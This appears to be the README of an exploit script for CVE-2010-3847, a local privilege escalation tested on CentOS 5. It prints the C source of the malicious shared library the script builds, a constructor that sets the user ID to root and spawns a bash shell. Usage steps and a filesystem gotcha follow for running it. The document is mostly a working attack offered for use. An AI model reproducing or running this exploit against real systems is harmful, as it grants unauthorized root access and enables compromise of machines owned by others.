CVE-2010-3847 script
====================
Meant to automate the exploit discussed in
[http://marc.info/?l=full-disclosure&m=128776663124692&w=2].  Tested on
CentOS 5 x86.

The DSO it outputs is compiled from the following code:
```c
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
void __attribute__((constructor)) init()
{
   setuid(0);
   system("/bin/bash");
}
```

Usage
-----
Download it, put it somewhere executable, and run it.

Gotchas
-------
`/tmp` and wherever `ping` is have to be on the same filesystem.  If not,
adjust the paths accordingly.
